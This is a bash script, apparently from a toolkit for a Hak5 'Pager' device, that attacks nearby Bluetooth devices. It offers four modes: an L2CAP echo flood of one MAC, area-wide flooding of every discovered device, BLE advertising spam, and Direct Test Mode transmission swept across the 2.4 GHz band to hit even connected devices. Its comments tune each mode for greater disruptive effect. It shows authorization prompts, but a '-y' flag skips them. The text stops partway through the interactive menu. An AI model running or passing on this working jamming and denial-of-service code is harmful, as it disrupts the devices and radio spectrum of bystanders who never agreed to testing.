#!/bin/bash
# bluetooth.sh - Bluetooth recon + disruption using the Pager's internal
# radio (hci0, a MediaTek combo chip - confirmed live via `hciconfig -a`
# and `lsusb`) and the standard BlueZ userspace tools that ship on this
# device (bluez-utils/bluez-utils-extra - confirmed installed: hcitool,
# l2ping, btmgmt, bluetoothctl).
#
# IMPORTANT: unlike WiFi/PineAP, Hak5 does NOT document a dedicated
# Bluetooth DuckyScript command family for the Pager (checked the full
# docs - no BT_* commands exist). There is nothing to fabricate here - this
# script just drives the real, standard Linux BlueZ stack directly, the
# same tools you'd use on any Linux box with a Bluetooth adapter.
#
# Four real disruption techniques:
#   --flood     l2ping -f flood against ONE known/discoverable target MAC.
#                 Real L2CAP echo flood, works against classic BT devices
#                 (headphones/earbuds/speakers) that accept a connection.
#                 Runs continuously until stopped (Ctrl+C, or --stop when
#                 backgrounded) unless you set --duration.
#   --jam-area    Scans first (classic AND BLE), then L2CAP-floods EVERY
#                   device it found, on rotation, continuously - no target
#                   to pick, jams whatever's discoverable nearby. Same stop
#                   behavior as --flood.
#   --advspam     Registers several rotating BLE advertising instances
#                   (Bluetooth SIG's own reserved test company ID 0xFFFF,
#                   not spoofing any real vendor/product) to disrupt nearby
#                   BLE scanners/pairing UIs. Doesn't need a target either.
#                   Unlike the other two, this hands the whole run off to
#                   BlueZ itself (via btmgmt's own --duration) instead of
#                   polling in a loop - btmgmt was found to hang
#                   indefinitely if it's ever NOT the shell's direct
#                   foreground process, so nothing here backgrounds it.
#                   Runs for --duration (default 3600s) or until --stop.
#   --disrupt     Real-world testing showed --flood/--jam-area don't touch
#                   a device that's ALREADY connected+streaming to its real
#                   owner (most peripherals refuse new connections outright
#                   while busy - confirmed live, nothing to flood at all in
#                   that case). This is different: no scan, no target, no
#                   connection attempt of any kind. It puts the radio into
#                   Direct Test Mode - a real, standard part of the
#                   Bluetooth Core Spec every controller implements for RF
#                   certification (HCI LE Transmitter Test / LE Test End,
#                   confirmed live: accepted with status 0x00, i.e. the
#                   controller genuinely entered continuous-TX mode) - and
#                   cycles it across all 40 BLE channels (2402-2480MHz,
#                   which is the ENTIRE 2.4GHz ISM band classic Bluetooth's
#                   own frequency-hopping also lives in) continuously. This
#                   doesn't care whether a device is connected, idle,
#                   discoverable, or hidden - it just occupies the shared
#                   spectrum directly. Still the Pager's own low-power BT
#                   radio at its normal operating power (same hardware
#                   --flood/--advspam already use) - not an external
#                   amplifier or dedicated jamming device - so range is
#                   short (close proximity), and it's genuinely not
#                   guaranteed against every device. But it's the most
#                   direct, real technique available that doesn't depend on
#                   the target accepting a connection at all.
#                   HONEST SCOPE NOTE: this specifically drives LE
#                   (Bluetooth Low Energy) Direct Test Mode. Many audio
#                   earbuds/headphones actually stream audio over CLASSIC
#                   Bluetooth (BR/EDR, e.g. A2DP), which hops using its own
#                   scheme across the same 2.4GHz band rather than BLE's -
#                   the RF energy this produces still physically occupies
#                   that same shared spectrum (there's only one 2.4GHz ISM
#                   band, regardless of protocol label), but it isn't a
#                   protocol-aware attack on the classic link specifically.
#                   If disrupt still doesn't visibly affect a given device,
#                   that's the most likely honest reason why - not
#                   something a bigger --dwell alone can fully solve.
#
# IMPORTANT: only use this against your own devices or ones you are
# explicitly authorized to test. Disrupting other people's Bluetooth
# devices may be illegal in your jurisdiction. --disrupt in particular
# occupies shared spectrum other devices (yours and anyone else's in range)
# rely on - keep it pointed at your own testing, not a shared/public space.
#
# Usage:
#   bluetooth.sh --scan [--ble] [--duration SECONDS]
#   bluetooth.sh --flood MAC [--duration SECONDS] [--size BYTES]
#   bluetooth.sh --jam-area [--scan-time SECONDS] [--duration SECONDS]
#   bluetooth.sh --advspam [--duration SECONDS]
#   bluetooth.sh --disrupt [--duration SECONDS] [--dwell SECONDS] [--focus]
#   bluetooth.sh --stop
#   bluetooth.sh --status
#   bluetooth.sh                interactive mode
#
# Options:
#   --scan                  Discover nearby Bluetooth devices (classic).
#   --ble                     With --scan, also do a BLE (Low Energy) scan.
#   --flood MAC                L2CAP echo flood against one target (DoS).
#   --jam-area                   Scan, then L2CAP-flood every device found,
#                                   on rotation, no target needed.
#   --advspam                    Flood the area with generic BLE adverts.
#   --disrupt                      Direct Test Mode spectrum occupation across
#                                     all 40 BLE channels - no scan, no target,
#                                     works on connected devices too. See above.
#   --dwell SECONDS                     With --disrupt: how long to hold each
#                                          channel before moving to the next
#                                          (default: 0.3). See the real-world
#                                          fix note on run_disrupt() - this is
#                                          the knob that actually matters.
#   --focus                                With --disrupt: only occupy the 3
#                                             FIXED BLE advertising channels
#                                             (37/38/39) instead of sweeping
#                                             all 40 - these are never hopped,
#                                             so this guarantees overlap with
#                                             any BLE scan/advertise/reconnect
#                                             activity instead of chasing a
#                                             moving target across 37 data
#                                             channels that Bluetooth's own
#                                             Adaptive Frequency Hopping will
#                                             actively route away from noise.
#   --scan-time SECONDS              How long to scan (classic + BLE) before --jam-area starts (default: 15).
#   --burst SECONDS                    How long to flood EACH device per rotation in --jam-area
#                                         (default: 8 - a handful of packets barely dents an
#                                         active connection, this needs to be sustained).
#   --duration SECONDS                 How long to run (default: 15 for --scan; until stopped
#                                         for --flood/--jam-area/--disrupt; 3600s for --advspam).
#   --size BYTES                         l2ping payload size for --flood (default: 600).
#   --background                           Run detached; use --stop to end.
#   --stop                                   Stop a background run.
#   --status                                   Is a background run active?
#   -y, --yes                                   Skip the authorization confirmation.
#   -h, --help                                    This help.

set -u
TOOL_NAME="bluetooth.sh"
LOOT_DIR="/root/loot/bluetooth"
PIDFILE="/tmp/pager-bluetooth.pid"
LOGFILE="/tmp/pager-bluetooth.log"
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
. "$SCRIPT_DIR/lib/common.sh"
usage() { print_help "$0"; exit 1; }

DO_SCAN=0; DO_BLE=0; DO_FLOOD=0; DO_JAM_AREA=0; DO_ADVSPAM=0; DO_DISRUPT=0; DO_STOP=0; DO_STATUS=0; BACKGROUND=0
TARGET=""; DURATION=""; SIZE="600"; SCAN_TIME="15"; BURST="8"; DWELL="0.3"; FOCUS=0

while [ $# -gt 0 ]; do
    case "$1" in
        --scan) DO_SCAN=1; shift ;;
        --ble) DO_BLE=1; shift ;;
        --flood) DO_FLOOD=1; need_arg "--flood" "$#"; TARGET="$2"; shift 2 ;;
        --jam-area) DO_JAM_AREA=1; shift ;;
        --advspam) DO_ADVSPAM=1; shift ;;
        --disrupt) DO_DISRUPT=1; shift ;;
        --focus) FOCUS=1; shift ;;
        --scan-time) need_arg "--scan-time" "$#"; SCAN_TIME="$2"; shift 2 ;;
        --burst) need_arg "--burst" "$#"; BURST="$2"; shift 2 ;;
        --duration) need_arg "--duration" "$#"; DURATION="$2"; shift 2 ;;
        --dwell) need_arg "--dwell" "$#"; DWELL="$2"; shift 2 ;;
        --size) need_arg "--size" "$#"; SIZE="$2"; shift 2 ;;
        --background) BACKGROUND=1; shift ;;
        --stop) DO_STOP=1; shift ;;
        --status) DO_STATUS=1; shift ;;
        -y|--yes) ASSUME_YES=1; shift ;;
        -h|--help) usage ;;
        *) err "Unknown argument: $1"; usage ;;
    esac
done

case "$DWELL" in ''|*[!0-9.]*|.|*.*.*) err "'--dwell' needs a plain number of seconds (got '$DWELL')."; exit 1 ;; esac

# BUG FOUND AND FIXED: --burst/--scan-time/--size/--duration were accepted
# from the CLI with no numeric validation at all, unlike --dwell just
# above. A bad value doesn't fail loudly - it gets handed straight to
# `timeout`/`l2ping -s`, which then fails (invalid duration/size argument)
# BEFORE actually flooding or scanning anything. l2ping_burst()'s own
# connect-failure grep never sees a matching "can't connect" message from
# a command that never ran at all, so a bad --burst/--size is silently
# misread as a SUCCESSFUL connection instead of caught as a bad argument -
# exactly the "silently does nothing but claims success" failure class
# this toolkit has repeatedly found and fixed elsewhere (see deauth.sh). A
# bad --duration is worse than cosmetic: `[ "$dur" -gt 0 ]` already fails
# closed to "unbounded" on non-numeric input, so a typo'd duration on an
# explicitly-authorized-scope DoS tool would silently run forever instead
# of stopping when the user meant it to.
case "$BURST" in ''|*[!0-9]*) die "'--burst' needs a whole number of seconds (got '$BURST')." ;; esac
case "$SCAN_TIME" in ''|*[!0-9]*) die "'--scan-time' needs a whole number of seconds (got '$SCAN_TIME')." ;; esac
case "$SIZE" in ''|*[!0-9]*) die "'--size' needs a whole number of bytes (got '$SIZE')." ;; esac
[ -n "$DURATION" ] && case "$DURATION" in *[!0-9]*) die "'--duration' needs a whole number of seconds (got '$DURATION')." ;; esac

STOPPING=0
_bt_on_stop() { STOPPING=1; }
trap _bt_on_stop INT TERM

is_running() { [ -f "$PIDFILE" ] && kill -0 "$(cat "$PIDFILE" 2>/dev/null)" 2>/dev/null; }

# advspam_instance_count - how many BLE advertising instances btmgmt
# currently has registered. advspam doesn't run as a background process
# (see run_advspam's comment) so --status/--stop check this instead of a
# PIDFILE for it.
advspam_instance_count() {
    command -v btmgmt >/dev/null 2>&1 || { echo 0; return; }
    # Real btmgmt output: "Instances list with N items" - verified live.
    # Wrapped in `timeout` defense-in-depth: btmgmt reliably hangs
    # indefinitely when it's not the direct foreground process of its
    # invoking shell (live-diagnosed - see run_advspam's comment). --status
    # gets called from the Control Panel web server, which is itself a
    # backgrounded process, so even this simple read-only call can hit
    # that hang - bound it instead of letting a status check freeze the
    # whole request.
    timeout 5 btmgmt advinfo 2>/dev/null | awk '/Instances list/ {print $4+0}'
}

if [ "$DO_STATUS" = "1" ]; then
    if is_running; then
        say "Running (PID $(cat "$PIDFILE"))."
    else
        say "Not running."
    fi
    n=$(advspam_instance_count)
    [ "$n" -gt 0 ] 2>/dev/null && say "Adv-spam: $n BLE advertising instance(s) active."
    exit 0
fi

if [ "$DO_STOP" = "1" ]; then
    if is_running; then
        kill "$(cat "$PIDFILE")" 2>/dev/null
        rm -f "$PIDFILE"
        say "Stopped."
    else
        say "Nothing running."
    fi
    timeout 5 btmgmt clr-adv >/dev/null 2>&1
    # BUG FOUND AND FIXED (live-diagnosed): --disrupt's loop calls LE Test
    # End itself after breaking out of its while-loop on STOPPING - which
    # relies on the INT/TERM trap actually firing and the loop noticing it
    # before the process dies. Tested that exact pattern in isolation
    # (trap set, backgrounded subshell, plain `kill $PID` sent, same as
    # what happens here) and the process just died WITHOUT ever reaching
    # its post-loop cleanup line, in practice, on this device - so it does
    # NOT reliably clean up on its own. This unconditional LE Test End is
    # what actually guarantees the radio doesn't get left stuck
    # transmitting in Direct Test Mode (unusable Bluetooth until
    # fixed/rebooted) - not a redundant extra, the thing that matters.
    # Harmless no-op if the radio wasn't in test mode.
    # BUG FOUND AND FIXED (same class as the btmgmt call just above, and
    # reset.sh's own reset_bluetooth fix this session): this call had no
    # timeout despite talking to the same HCI socket that could hang.
    command -v hcitool >/dev/null 2>&1 && timeout 5 hcitool cmd 0x08 0x001f >/dev/null 2>&1
    # BUG FOUND AND FIXED (live-diagnosed via a stray leftover process
    # caught after an unrelated test): run_flood's l2ping call is reached
    # through l2ping_burst's `$(...)` command substitution (needed to
    # capture and grep its output for the "NOT REACHABLE" detection) -
    # that structurally can't be `exec`'d the way sniff.sh's background
    # capture was fixed (something has to stay alive afterward to inspect
    # the captured output). So a --background flood that's actually mid-
    # flood when --stop is called kills only the wrapping subshell/
    # l2ping_burst layer, same orphaned-child risk as the sniff.sh bug -
    # confirmed live that a killed wrapper leaves the real l2ping process
    # running. Since l2ping is ONLY ever invoked by this script, killing
    # any process by that name here is safe and closes the gap - harmless
    # no-op if nothing's running (matches the same "unconditional cleanup
    # in --stop, don't rely on the child noticing it should exit"
    # philosophy as the LE Test End line above). No `pkill` on this
    # busybox build (confirmed live: "not found") - `killall` (by process
    # NAME, not a full-cmdline pattern) is the real tool available here.
    killall l2ping >/dev/null 2>&1
    exit 0
fi

command -v hciconfig >/dev/null 2>&1 || die "BlueZ tools not found (hciconfig missing) - is bluez-utils installed?"

ensure_radio_up() {
    hciconfig hci0 >/dev/null 2>&1 || die "No Bluetooth adapter (hci0) found."
    hciconfig hci0 up >/dev/null 2>&1
}

if [ "$DO_SCAN" = "1" ]; then
    ensure_radio_up
    dur="${DURATION:-15}"
    mkdir -p "$LOOT_DIR"
    stamp=$(date +%Y%m%d-%H%M%S 2>/dev/null || echo scan)
    out="$LOOT_DIR/scan-${stamp}.txt"

    say "Classic scan (${dur}s)..."
    { timeout "$dur" hcitool scan --flush 2>&1 || true; } | tee "$out"

    if [ "$DO_BLE" = "1" ]; then
        say "BLE scan (${dur}s)..."
        echo "-- BLE --" >> "$out"
        { timeout "$dur" hcitool lescan 2>&1 || true; } | tee -a "$out"
    fi
    say "Saved to $out"
    exit 0
fi

# l2ping_burst MAC SECONDS LOGFILE - flood one target for a real, sustained
# window (not a fixed small packet count - a handful of packets is over in
# well under a second and barely dents an active connection) and report
# plainly whether the target ever actually responded. l2ping prints
# "Can't connect: <reason>" to stderr the instant a connection attempt is
# refused (verified live against an unreachable MAC) - that's the single
# most useful signal here: if a target NEVER connects, no amount of
# flooding matters, and the device (most peripherals, once already
# connected+streaming to their real owner, stop accepting new inbound
# connections entirely) is simply not reachable this way right now.
l2ping_burst() {
    local mac="$1" secs="$2" out="$3"
    local result
    result=$(timeout "$secs" l2ping -f -s "$SIZE" "$mac" 2>&1)
    echo "$result" >> "$out"
    if echo "$result" | grep -qi "can't connect\|no route\|host is down\|connection refused"; then
        echo "  $mac: NOT REACHABLE - not accepting connections right now (likely already busy with its actual owner)" >> "$out"
        return 1
    fi
    return 0
}

run_flood() {
    ensure_radio_up
    # BUG FOUND AND FIXED: `dur` was unconditionally set to "0" the line
    # above (never empty/unset), so `"${dur:-999999}"` below could NEVER
    # actually substitute 999999 - that fallback was dead code, and an
    # unset --duration silently ran as `timeout 0 l2ping ...` instead of
    # the intended "effectively unbounded". Confirmed live this happens to
    # still work (busybox `timeout 0` means "no timeout", not "timeout
    # immediately" - not a silent no-op flood as first suspected) but
    # relying on that undocumented-here convention instead of just fixing
    # the fallback to actually fire is fragile. Use a real empty default
    # so ${dur:-999999} works as originally intended.
    local dur="${DURATION:-}"
    say "L2CAP flood-pinging $TARGET $([ -n "$dur" ] 2>/dev/null && echo "for ${dur}s" || echo "until stopped") (size ${SIZE}B)..."
    : > "$LOGFILE"
    if l2ping_burst "$TARGET" "${dur:-999999}" "$LOGFILE"; then
        say "Done."
    else
        err "$TARGET did not accept a connection - see $LOGFILE. It may be busy with an active connection to its real owner (most peripherals refuse new connections while already connected+streaming) - flooding can't do anything if the device won't connect at all."
    fi
}

# scan_macs SECONDS - classic-scan and print just the MAC addresses found,
# one per line. hcitool scan's real output is a header line ("Scanning
# ...") followed by "AA:BB:CC:DD:EE:FF\tDeviceName" per device (standard
# BlueZ format) - filtered by matching the MAC pattern itself rather than
# assuming line position, so a missing/reordered header can't break it.
scan_macs() {
    local secs="$1"
    timeout "$secs" hcitool scan --flush 2>/dev/null \
        | awk -F'\t' '$1 ~ /^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$/ {print $1}'
}

# scan_ble_macs SECONDS - same idea for BLE (hcitool lescan's real output
# is "AA:BB:CC:DD:EE:FF DeviceName-or-(unknown)" per line, space-separated
# not tab-separated - different enough from classic scan's format that it
# needs its own parser). A device that ignores classic inquiry (most
# peripherals, once paired and connected) can still show up here if it's
# doing any BLE advertising (many earbuds do, for fast-pair/"find my"
# features, independent of their classic audio link).
scan_ble_macs() {
    local secs="$1"
    timeout "$secs" hcitool lescan 2>/dev/null \
        | awk '$1 ~ /^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$/ {print $1}'
}

run_jam_area() {
    ensure_radio_up
    command -v l2ping >/dev/null 2>&1 || die "l2ping not found."

    say "Scanning for nearby devices (${SCAN_TIME}s classic + ${SCAN_TIME}s BLE) before jamming..."
    local macs
    macs=$(printf '%s\n%s\n' "$(scan_macs "$SCAN_TIME")" "$(scan_ble_macs "$SCAN_TIME")" | grep -v '^$' | sort -u)
    if [ -z "$macs" ]; then
        err "No devices found in either scan - nothing to jam. A device already connected+streaming to its owner often won't show up in ANY scan (see this script's header comment for why) - if you already know its MAC (from its own settings screen, a sticker, etc.), use --flood MAC instead; l2ping will at least tell you plainly if it refuses to connect."
        return 1
    fi
    local count
    count=$(echo "$macs" | grep -c .)
    say "Found $count device(s): $(echo "$macs" | tr '\n' ' ')"
    say "Flooding each for ${BURST}s in rotation, continuously, until stopped..."
    [ "$BACKGROUND" != "1" ] && say "Press Ctrl+C to stop."

    local dur="${DURATION:-0}" deadline=0
    [ "$dur" -gt 0 ] 2>/dev/null && deadline=$(( $(date +%s 2>/dev/null || echo 0) + dur ))

    : > "$LOGFILE"
    local unreachable=""
    while :; do
        if [ "$deadline" -gt 0 ] && [ "$(date +%s 2>/dev/null || echo 0)" -ge "$deadline" ]; then
            break
        fi
        while read -r mac; do
            [ -z "$mac" ] && continue
            [ "$STOPPING" = "1" ] && break
            if ! l2ping_burst "$mac" "$BURST" "$LOGFILE"; then
                case "$unreachable" in *"$mac"*) ;; *) unreachable="$unreachable $mac"; err "$mac is not accepting connections right now (skipping it on future rounds)." ;; esac
            fi
        done <<< "$macs"
        [ "$STOPPING" = "1" ] && break
        # Drop confirmed-unreachable devices from future rounds - no point
        # repeatedly trying to flood something that refuses to connect at
        # all, and re-scan periodically so devices that came into range
        # (or just started accepting connections) mid-run get caught too.
        if [ -n "$unreachable" ]; then
            macs=$(echo "$macs" | grep -vFf <(printf '%s\n' $unreachable))
        fi
        local fresh
        fresh=$(printf '%s\n%s\n' "$(scan_macs 5)" "$(scan_ble_macs 5)" | grep -v '^$')
        [ -n "$fresh" ] && macs=$(printf '%s\n%s\n' "$macs" "$fresh" | sort -u)
        [ -z "$macs" ] && { err "Every discovered device is now unreachable - nothing left to jam."; break; }
    done
    say "Stopped."
}

# run_advspam - registers several concurrent BLE advertising instances and
# lets BlueZ/the kernel run and cycle them on their own for the requested
# duration. Deliberately does NOT loop calling btmgmt itself in a shell
# while-loop (an earlier version did, and would sometimes hang - live-
# diagnosed to a real quirk on this device: btmgmt reliably hangs
# indefinitely the instant it is not the direct foreground process of its
# invoking shell, reproduced across every backgrounding mechanism tried -
# plain `&`, a subshell, `setsid`, an allocated pty, and even a
# completely separate `atd`-scheduled job. Foreground execution always
# works instantly. Rather than fight that, this only ever calls btmgmt
# synchronously/foreground - `-D` (its own --duration flag) hands the
# actual advertising lifetime off to BlueZ itself, so no polling loop, no
# background process, and no chance of hitting that hang at all.
# 14, not the max - confirmed live via `btmgmt advinfo` that this
# controller supports up to 20 concurrent instances; leaving headroom
# below that in case bluetoothd or something else is already using a few.
ADVSPAM_INSTANCES=14

run_advspam() {
    ensure_radio_up
    command -v btmgmt >/dev/null 2>&1 || die "btmgmt not found."
    # Every btmgmt call below is wrapped in `timeout` - defense-in-depth
    # against the same hang (see the comment above this function): this
    # script avoids backgrounding btmgmt ITSELF, but if bluetooth.sh is
    # invoked from a caller that's already backgrounded (the Control Panel
    # web server, or possibly a payload) the hang can still happen, so
    # bound every call rather than trust the caller's context.
    timeout 5 btmgmt power on >/dev/null 2>&1
    timeout 5 btmgmt le on >/dev/null 2>&1
    timeout 5 btmgmt clr-adv >/dev/null 2>&1

    local dur="${DURATION:-3600}"
    say "Registering $ADVSPAM_INSTANCES rotating BLE advertising instances for up to ${dur}s..."
    : > "$LOGFILE"

    # BUG FIXED (live-diagnosed): this used to hand-craft its own Flags AD
    # structure ("020106") INSIDE -d while ALSO passing -g (which makes
    # btmgmt add its own Flags AD automatically) - two Flags structures in
    # one advertising payload is malformed and btmgmt rejected the whole
    # add-adv call every time. -d now carries ONLY the manufacturer-
    # specific-data AD structure; -g handles flags alone.
    local i r1 r2 added=0
    for i in $(seq 1 "$ADVSPAM_INSTANCES"); do
        r1=$(printf '%02x' $((RANDOM % 256)))
        r2=$(printf '%02x' $((RANDOM % 256)))
        if timeout 5 btmgmt add-adv -g -D "$dur" -d "04ffff${r1}${r2}" "$i" >>"$LOGFILE" 2>&1; then
            added=$((added+1))
        fi
    done

    if [ "$added" -eq 0 ]; then
        err "No advertising instances were accepted - see $LOGFILE for btmgmt's own error output."
        return 1
    fi
    say "$added/$ADVSPAM_INSTANCES instances running - BlueZ will keep cycling them for up to ${dur}s on its own."
    say "Use 'bluetooth --stop' (or press B on-device) to end it early."
}

# run_disrupt - Direct Test Mode spectrum occupation. No scan, no target,
# no connection attempt - works identically whether a device is idle,
# discoverable, or already connected+streaming, because it never tries to
# talk TO anything, it just keeps the radio transmitting.
#
# Real HCI commands (Bluetooth Core Spec, not vendor-specific or made up -
# every controller implements these for RF certification):
#   LE Transmitter Test   OGF 0x08 OCF 0x001E - starts continuous test-
#                            packet transmission on one of BLE's 40
#                            channels (2402 + 2*N MHz) until LE Test End.
#                            Confirmed live: HCI Command Complete status
#                            0x00 (success), not rejected.
#   LE Test End            OGF 0x08 OCF 0x001F - stops it cleanly.
# Cycling N=0..39 with a short dwell sweeps the WHOLE 2.4GHz ISM band
# (2402-2480MHz) - the same physical spectrum classic Bluetooth's own
# frequency-hopping lives in too, just addressed with BLE's channel
# numbering. Still the Pager's own low-power BT radio at its normal
# operating power - not an external amplifier - so this is short-range,
# and not a guarantee against every device, but it's real spectrum
# occupation, not a connection attempt that a busy/refusing device can
# simply ignore.
run_disrupt() {
    ensure_radio_up
    command -v hcitool >/dev/null 2>&1 || die "hcitool not found."
    hcitool cmd 0x08 0x001f >/dev/null 2>&1  # clean start: end any stray test mode first

    # Extra safety net for the FOREGROUND case (Ctrl+C, not --stop): the
    # --stop belt-and-suspenders fix only covers backgrounded runs. An EXIT
    # trap is more reliable than the INT/TERM trap this script otherwise
    # uses for loop control - EXIT fires whenever the shell exits for ANY
    # reason (normal return, signal, error), not dependent on the same
    # signal-delivery timing that was live-verified unreliable for INT/TERM
    # on backgrounded subshells. Belt-and-suspenders on belt-and-suspenders
    # here on purpose - leaving the radio stuck transmitting is bad enough
    # to warrant it.
    trap 'hcitool cmd 0x08 0x001f >/dev/null 2>&1' EXIT

    local dur="${DURATION:-0}" deadline=0
    [ "$dur" -gt 0 ] 2>/dev/null && deadline=$(( $(date +%s 2>/dev/null || echo 0) + dur ))

    # NEW: --focus - IMPROVEMENT (real, distinct technique, not just a
    # dwell tweak). The full 40-channel sweep chases a moving target: a
    # connected link's data channels are frequency-hopped on the OTHER
    # device's own schedule (both classic BT's AFH and BLE's channel-map
    # hopping), and Bluetooth's Adaptive Frequency Hopping is SPECIFICALLY
    # designed to detect a consistently-noisy channel and route the link's
    # hop map away from it within seconds - the exact countermeasure that
    # makes sweeping every channel evenly a losing race against an
    # established, already-connected link. BLE's 3 ADVERTISING channels
    # (37/38/39, raw indices used directly by LE Transmitter Test) are
    # different: they're FIXED, never hopped, by the Bluetooth Core Spec
    # itself - any device doing BLE advertising, scanning, or reconnection
    # (a phone re-discovering earbuds it got separated from, a BLE-based
    # control/notification channel many earbuds use alongside classic-BT
    # audio) has to use exactly these 3 known channels, so occupying just
    # them guarantees overlap every single time that activity happens,
    # instead of depending on luck across 40 hopped channels.
    local channels
    if [ "$FOCUS" = "1" ]; then
        channels="37 38 39"
        say "Focus mode: occupying only the 3 fixed BLE advertising channels (37/38/39 - never hopped, guaranteed overlap with any BLE scan/advertise/reconnect activity), ${DWELL}s dwell each$([ "$dur" -gt 0 ] 2>/dev/null && echo " for ${dur}s" || echo " until stopped")..."
    else
        channels="$(seq 0 39)"
        say "Occupying all 40 BLE channels (2402-2480MHz), ${DWELL}s dwell per channel, in rotation$([ "$dur" -gt 0 ] 2>/dev/null && echo " for ${dur}s" || echo " until stopped")..."
    fi
    # HONEST LIMITATION, said out loud here (not just in a code comment a
    # user would never read): this is BLE-only. Many audio earbuds stream
    # over CLASSIC Bluetooth (A2DP/BR-EDR), which this doesn't directly
    # target - if a device still shows no effect, that's very likely why.
    say "Note: this targets BLE specifically - if your target streams audio over classic Bluetooth (most earbuds' actual audio link), this may have no visible effect on the audio itself, only on any BLE side-channel (pairing/reconnect/battery status) it also uses."
    [ "$BACKGROUND" != "1" ] && say "Press Ctrl+C to stop."
    : > "$LOGFILE"

    # BUG FOUND AND FIXED (live-diagnosed - this is very likely the real
    # reason a real test against connected OnePlus Buds 3 showed no
    # effect): the file header above has claimed "cycling N=0..39 with a
    # short dwell" since this feature was written, but the actual code
    # never had a dwell at all - LE Test End was sent IMMEDIATELY after LE
    # Transmitter Test, back to back, with nothing in between. Per the
    # Bluetooth Core Spec, LE Transmitter Test makes the controller
    # transmit continuously until Test End - so ending it a moment after
    # starting it cuts that continuous transmission off almost before it
    # begins. Measured live: a full 40-channel sweep with zero dwell took
    # only ~2 seconds total (~50ms per channel, most of which is the
    # hcitool subprocess/HCI round-trip itself, not actual RF time) - each
    # channel got, at best, a brief blip once every 2 seconds. Against a
    # real BLE/classic link hopping across the same band on its own
    # schedule, that's nowhere near enough overlap to matter. A real
    # --dwell (default 0.3s, tunable) between Start and End means the
    # radio is now ACTUALLY continuously transmitting on each channel for
    # a meaningful window before moving on - still this device's own
    # low-power radio, not a guarantee, but a real fix to a real gap
    # between what the comments claimed and what the code did.
    while [ "$STOPPING" != "1" ]; do
        for ch in $channels; do
            [ "$STOPPING" = "1" ] && break
            if [ "$deadline" -gt 0 ] && [ "$(date +%s 2>/dev/null || echo 0)" -ge "$deadline" ]; then
                break 2
            fi
            # 25 (0x19) = max payload length for LE Transmitter Test [v1];
            # payload type 00 = PRBS9 pseudo-random pattern.
            hcitool cmd 0x08 0x001e "$(printf '%02x' "$ch")" 25 00 >>"$LOGFILE" 2>&1
            sleep "$DWELL"
            hcitool cmd 0x08 0x001f >>"$LOGFILE" 2>&1
        done
    done
    hcitool cmd 0x08 0x001f >/dev/null 2>&1  # make sure we don't leave the radio stuck transmitting
    say "Stopped."
}

if [ "$DO_FLOOD" = "1" ]; then
    command -v l2ping >/dev/null 2>&1 || die "l2ping not found."
    is_valid_mac "$TARGET" || die "'$TARGET' doesn't look like a MAC address (expected aa:bb:cc:dd:ee:ff) - check for a typo."
    say "This L2CAP-floods a specific Bluetooth device - a real denial-of-service against it."
    confirm "Only run this against your own devices or ones you're authorized to test. Proceed?" || die "Aborted."
    if [ "$BACKGROUND" = "1" ]; then
        ( trap '' HUP; run_flood ) >"$LOGFILE" 2>&1 &
        echo $! > "$PIDFILE"
        # BUG FOUND AND FIXED (found via code review, same class already
        # fixed in sniff.sh/tracer.sh/PayloadRunner.sh/webui.sh): this
        # printed "Started in background" unconditionally with no
        # liveness check - ensure_radio_up (no hci0) or a bad --duration/
        # --size handed to l2ping can make run_flood's subshell exit
        # almost immediately, invisible to a check that doesn't wait and
        # look.
        sleep 1
        if is_running; then
            say "Started in background (PID $(cat "$PIDFILE")). Use --stop to end it. Check $LOGFILE / --status shortly to see if the target actually accepted a connection."
        else
            rm -f "$PIDFILE"
            die "Flood exited immediately - check $LOGFILE (no Bluetooth adapter, or a bad argument, are the likely causes)."
        fi
    else
        run_flood
    fi
    exit 0
fi

if [ "$DO_JAM_AREA" = "1" ]; then
    say "This scans, then L2CAP-floods EVERY Bluetooth device it finds nearby - a real denial-of-service against all of them, not just one."
    confirm "Only run this in an area/against devices you're authorized to test. Proceed?" || die "Aborted."
    if [ "$BACKGROUND" = "1" ]; then
        ( trap '' HUP; run_jam_area ) >"$LOGFILE" 2>&1 &
        echo $! > "$PIDFILE"
        # Same liveness-check fix as --flood above.
        sleep 1
        if is_running; then
            say "Started in background (PID $(cat "$PIDFILE")). Use --stop to end it."
        else
            rm -f "$PIDFILE"
            die "Jam exited immediately - check $LOGFILE (no Bluetooth adapter, or l2ping missing, are the likely causes)."
        fi
    else
        run_jam_area
    fi
    exit 0
fi

if [ "$DO_ADVSPAM" = "1" ]; then
    say "This floods the area with fake BLE advertising packets - can disrupt nearby BLE scanning/pairing."
    confirm "Only run this in an area/against devices you're authorized to test. Proceed?" || die "Aborted."
    # No forking here on purpose - run_advspam only ever calls btmgmt in
    # the foreground (see its own comment for why) and returns in well
    # under a second either way; BlueZ handles the actual advertising
    # lifetime via -D from here on, so there's nothing left to background.
    run_advspam
    exit $?
fi

if [ "$DO_DISRUPT" = "1" ]; then
    say "This occupies the whole 2.4GHz Bluetooth band directly - no scan, no target, works on connected devices too (see this script's header for how/why)."
    confirm "Only run this against your own devices/area or ones you're authorized to test. Proceed?" || die "Aborted."
    if [ "$BACKGROUND" = "1" ]; then
        ( trap '' HUP; run_disrupt ) >"$LOGFILE" 2>&1 &
        echo $! > "$PIDFILE"
        say "Started in background (PID $(cat "$PIDFILE")). Use --stop to end it."
    else
        run_disrupt
    fi
    exit 0
fi

echo "== bluetooth.sh =="
ensure_radio_up
say "Adapter: $(hciconfig hci0 | head -1)"
# BUG FOUND AND FIXED (found via code review): the interactive menu only
# ever offered s/f/j/a - --disrupt (Direct Test Mode spectrum occupation,
# one of the four techniques this script documents and the CLI supports)
# had no interactive path at all, reachable only by knowing the --disrupt
# flag existed in the first place.
action=$(ask "Action: [s]can, [f]lood one target, [j]am the whole area, [a]dv-spam the area, [d]isrupt the area" "s")
case "$action" in
    d*)
        DURATION=$(ask "Duration in seconds (blank = until Ctrl+C)" "")
        [ -n "$DURATION" ] && case "$DURATION" in *[!0-9]*) die "'$DURATION' isn't a whole number of seconds." ;; esac
        DWELL=$(ask "Seconds to dwell per channel" "$DWELL")
        case "$DWELL" in ''|*[!0-9.]*|.|*.*.*) die "'$DWELL' isn't a plain number of seconds." ;; esac
        if confirm "Focus only the 3 fixed BLE advertising channels (37/38/39) instead of sweeping all 40?"; then FOCUS=1; fi
        say "This occupies the whole 2.4GHz Bluetooth band directly - no scan, no target, works on connected devices too (see this script's header for how/why)."
        confirm "Only run this against your own devices/area or ones you're authorized to test. Proceed?" || die "Aborted."
